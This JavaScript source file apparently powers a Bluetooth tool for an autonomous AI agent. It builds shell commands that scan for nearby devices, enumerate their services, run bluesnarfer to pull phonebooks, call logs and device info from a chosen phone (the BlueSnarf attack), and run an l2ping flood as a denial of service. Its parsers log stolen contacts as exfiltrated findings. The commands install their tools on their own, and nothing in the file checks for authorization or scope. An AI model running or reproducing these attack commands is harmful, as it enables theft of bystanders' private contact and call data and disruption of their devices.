// Bluetooth attack + recon command builders and parsers (added 2026-07-16).
//
// Powers the ```bluetooth agent tool. Discovers nearby Bluetooth devices, enumerates their
// services, and runs **bluesnarfer** to pull data (device info, phonebook/contacts, call
// logs) from a selected device over OBEX/AT — the classic BlueSnarf attack.
//
// Execution needs a Bluetooth adapter on the exec backend (Linux host / Kali container with
// USB passthrough); on a bare Windows host these commands find no adapter — that's expected.
// bluesnarfer isn't in the base image, so commands self-install it (apt, else build from source).

// Install bluesnarfer if it isn't already on PATH (apt package, else compile from source).
const ENSURE_BLUESNARFER =
  'command -v bluesnarfer >/dev/null 2>&1 || { ' +
  'apt-get update -y >/dev/null 2>&1; ' +
  'apt-get install -y bluesnarfer bluez bluez-tools libbluetooth-dev >/dev/null 2>&1 || ' +
  '{ apt-get install -y git build-essential libbluetooth-dev >/dev/null 2>&1; ' +
  'git clone https://github.com/kimbo/bluesnarfer /tmp/bluesnarfer >/dev/null 2>&1; ' +
  'make -C /tmp/bluesnarfer >/dev/null 2>&1 && cp /tmp/bluesnarfer/bluesnarfer /usr/local/bin/; }; }; ';

const ENSURE_BLUEZ =
  'command -v hcitool >/dev/null 2>&1 || apt-get install -y bluez bluez-tools >/dev/null 2>&1; ';

// Bring up the first HCI adapter (best-effort) before scanning/attacking.
const HCI_UP = 'hciconfig hci0 up >/dev/null 2>&1; rfkill unblock bluetooth >/dev/null 2>&1; ';

// Actionable message when there is no Bluetooth radio on the exec backend — far clearer than
// the raw "Device not found" / "No such device" the tools print. Bluetooth is line-of-sight
// hardware: the exec backend needs its OWN adapter physically near the target.
const NO_ADAPTER_MSG =
  '[!] No Bluetooth adapter on this exec backend. Bluetooth attacks need a real Linux BT radio ' +
  'near the target. On Windows+Docker none is available (the host Bluetooth is NOT passed into ' +
  'the WSL2/Docker VM). Fix: run a bare-metal Kali, or set EXEC_BACKEND=ssh pointing at a Kali ' +
  'box that has a USB/onboard adapter (verify there first with the bluetooth `check` action).';

// Preflight guard: bail out early with the message above unless an hci* adapter is present.
const REQUIRE_ADAPTER =
  `if ! hciconfig 2>/dev/null | grep -q '^hci'; then echo ${JSON.stringify(NO_ADAPTER_MSG)}; exit 3; fi; `;

// Build a command for a high-level Bluetooth action.
//   action: scan | lescan | info | services | snarf | contacts | calls | ping | flood
//   mac    : target BD_ADDR (AA:BB:CC:DD:EE:FF)
//   chan   : RFCOMM channel for bluesnarfer (default 3; find real one via `services`)
//   range  : phonebook entry range, e.g. "1-100"
export function buildBluetoothCommand({ action, mac, chan = 3, range = '1-100', iface = 'hci0' } = {}) {
  const snarf = (extra) =>
    ENSURE_BLUESNARFER + HCI_UP + REQUIRE_ADAPTER + `bluesnarfer -b ${mac} -C ${chan} ${extra}`;

  switch (action) {
    case 'check':
      // Preflight — report adapter status clearly (run this before scanning a new backend).
      return ENSURE_BLUEZ +
        'rfkill unblock bluetooth >/dev/null 2>&1; ' +
        `if hciconfig 2>/dev/null | grep -q '^hci'; then ` +
        'echo "[+] Bluetooth adapter present:"; hciconfig -a; ' +
        `else echo ${JSON.stringify(NO_ADAPTER_MSG)}; fi`;
    case 'scan':
      // Classic inquiry scan — nearby discoverable devices (MAC + name).
      return ENSURE_BLUEZ + HCI_UP + REQUIRE_ADAPTER + `hcitool -i ${iface} scan --flush`;
    case 'lescan':
      // BLE devices (phones, wearables, beacons). Timeout so it returns.
      return ENSURE_BLUEZ + HCI_UP + REQUIRE_ADAPTER + `timeout 15 hcitool -i ${iface} lescan || true`;
    case 'info':
      // Device class / manufacturer / features.
      return ENSURE_BLUEZ + HCI_UP + REQUIRE_ADAPTER + `hcitool -i ${iface} info ${mac}; sdptool browse ${mac} 2>/dev/null | head -40`;
    case 'services':
      // Enumerate RFCOMM channels/services — pick the phonebook channel from here.
      return ENSURE_BLUEZ + HCI_UP + REQUIRE_ADAPTER + `sdptool browse ${mac}`;
    case 'ping':
      // L2CAP echo — is the device in range / responding?
      return ENSURE_BLUEZ + HCI_UP + REQUIRE_ADAPTER + `l2ping -c 5 ${mac}`;
    case 'info-snarf':
      return snarf('-i');
    case 'snarf':
    case 'contacts':
      // Read phonebook (contacts) entries — the core BlueSnarf data grab.
      return snarf(`-r ${range}`);
    case 'calls':
      // Read recent-call list (MC = missed/dialed/received via source).
      return snarf(`-s MC -r ${range}`);
    case 'flood':
      // BlueSmack-style L2CAP flood (DoS) — parity with the wireless deauth action.
      return ENSURE_BLUEZ + HCI_UP + REQUIRE_ADAPTER + `l2ping -i ${iface} -s 600 -f ${mac}`;
    default:
      return ENSURE_BLUEZ + HCI_UP + REQUIRE_ADAPTER + `hcitool -i ${iface} scan --flush`;
  }
}

// Parse `hcitool scan` output -> device findings (MAC + name).
export function parseBtScan(text, source = 'hcitool') {
  const out = [];
  for (const raw of String(text).split('\n')) {
    const m = /([0-9A-F]{2}(?::[0-9A-F]{2}){5})\s+(.+)$/i.exec(raw.trim());
    if (m && !/scanning|inquiry/i.test(raw)) {
      out.push({
        finding_type: 'bluetooth',
        severity: 'info',
        title: `Bluetooth device: ${m[2].trim()} (${m[1]})`,
        host: m[1].toUpperCase(),
        evidence: raw.trim().slice(0, 160),
        source,
      });
    }
  }
  return out;
}

// Parse bluesnarfer phonebook output -> contact findings.
export function parseBluesnarfer(text, source = 'bluesnarfer') {
  const out = [];
  const t = String(text);
  // bluesnarfer prints lines like:  name : "John", number : "+1555..."
  const entry = /name\s*:\s*"?([^",\n]+)"?\s*,?\s*(?:number|tel)?\s*:?\s*"?([+\d][\d\s\-()]{4,})?/gi;
  let m;
  while ((m = entry.exec(t)) !== null) {
    const name = (m[1] || '').trim();
    const num = (m[2] || '').trim();
    if (!name && !num) continue;
    out.push({
      finding_type: 'bluetooth',
      severity: 'high',
      title: `Contact exfiltrated: ${name || '(no name)'}${num ? ' — ' + num : ''}`,
      evidence: m[0].slice(0, 160),
      source,
    });
  }
  if (/device name\s*:/i.test(t)) {
    const dn = /device name\s*:\s*(.+)/i.exec(t)?.[1]?.trim();
    if (dn) out.push({ finding_type: 'bluetooth', severity: 'medium', title: `Bluetooth device info leaked: ${dn}`, evidence: t.slice(0, 160), source });
  }
  return out;
}

export function extractBluetoothFindings(command, output) {
  if (!/hcitool|bluesnarfer|l2ping|sdptool/i.test(command) || !output) return [];
  return [...parseBtScan(output), ...parseBluesnarfer(output)];
}
